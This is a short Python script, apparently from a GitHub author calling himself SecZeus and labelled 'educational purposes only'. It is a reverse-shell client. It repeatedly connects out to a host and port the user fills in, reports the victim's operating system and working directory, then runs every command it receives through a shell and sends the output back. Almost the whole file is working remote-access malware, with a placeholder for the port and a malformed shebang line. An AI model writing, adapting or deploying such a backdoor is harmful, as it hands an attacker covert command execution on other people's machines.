#!usr/bin/env python3
# -*- coding: utf-8 -*-

'''
    Coded By: SecZeus
    https://www.github.com/seczeus

    Software made ONLY for educational purposes.
    If you, at any time perform any illegal activity with it, i will not be responsabilized.

    You're FREE to USE, MODIFY, DELETE and DISTRIBUTE

    By using this software you agree with these terms
'''

import socket
import subprocess
from subprocess import call
import platform
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "" #Any IP Address you wish
porta = #Port of the connection (It has to be an integer)

while True:
    try:
        s.connect((host, porta))
        break
    except(socket.error,socket.timeout):
        continue

oss = platform.system() + " " + platform.release() + " " + platform.version()
s.send(oss.encode('ascii'))
directory = os.getcwd()
s.send(directory.encode('ascii'))

while True:
    command = s.recv(1024)
    if (command[:2].decode('ascii') == "cd"):
        os.chdir(command[3:].decode('ascii'))
    if (len(command.decode('ascii')) > 0):
        cmd = subprocess.Popen([command[:].decode('utf-8')], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        output_str = output.decode('ascii', 'ignore')
        s.send(output_str.encode('ascii') + os.getcwd().encode('ascii') + ">".encode('ascii'))
    else:
        s.close()
